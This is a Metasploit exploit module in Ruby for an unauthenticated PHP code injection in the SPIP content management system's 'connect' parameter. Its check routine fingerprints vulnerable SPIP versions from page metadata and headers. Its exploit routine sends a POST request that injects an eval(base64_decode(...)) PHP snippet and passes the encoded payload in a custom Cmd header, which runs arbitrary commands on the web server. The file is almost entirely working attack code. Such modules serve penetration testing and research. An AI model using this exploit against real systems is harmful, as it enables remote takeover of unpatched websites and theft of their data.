##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SPIP connect Parameter PHP Injection',
      'Description'    => %q{
        This module exploits a PHP code injection in SPIP. The vulnerability exists in the
        connect parameter and allows an unauthenticated user to execute arbitrary commands
        with web user privileges. Branchs 2.0, 2.1 and 3 are concerned. Vulnerable versions
        are <2.0.21, <2.1.16 and < 3.0.3, but this module works only against branch 2.0 and
        has been tested successfully with SPIP 2.0.11 and SPIP 2.0.20 with Apache on Ubuntu
        and Fedora linux distributions.
      },
      'Author'         =>
        [
          'Arnaud Pachot',   #Initial discovery
          'Frederic Cikala', # PoC
          'Davy Douhine'     # PoC and MSF module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '83543' ],
          [ 'BID', '54292' ],
          [ 'URL', 'http://contrib.spip.net/SPIP-3-0-3-2-1-16-et-2-0-21-a-l-etape-303-epate-la' ]
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Automatic', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 04 2012'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to SPIP application', '/']),
      ], self.class)
  end

  def check
    version = nil
    uri = normalize_uri(target_uri.path, "spip.php")

    res = send_request_cgi({ 'uri' => "#{uri}" })

    if res and res.code == 200 and res.body =~ /<meta name="generator" content="SPIP (.*) \[/
      version = $1
    end

    if version.nil? and res.code == 200 and res.headers["Composed-By"] =~ /SPIP (.*) @/
      version = $1
    end

    if version.nil?
      return Exploit::CheckCode::Unknown
    end

    vprint_status("SPIP Version detected: #{version}")

    if version =~ /^2\.0/ and version < "2.0.21"
      return Exploit::CheckCode::Appears
    elsif version =~ /^2\.1/ and version < "2.1.16"
      return Exploit::CheckCode::Appears
    elsif version =~ /^3\.0/ and version < "3.0.3"
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe

  end

  def exploit
    uri = normalize_uri(target_uri.path, 'spip.php')
    print_status("#{rhost}:#{rport} - Attempting to exploit...")
    res = send_request_cgi(
      {
        'uri'    => uri,
        'method' => 'POST',
        'vars_post' => {
          'connect' => "?><? eval(base64_decode($_SERVER[HTTP_CMD])); ?>",
        },
        'headers' => {
          'Cmd' => Rex::Text.encode_base64(payload.encoded)
        }
      })
  end

end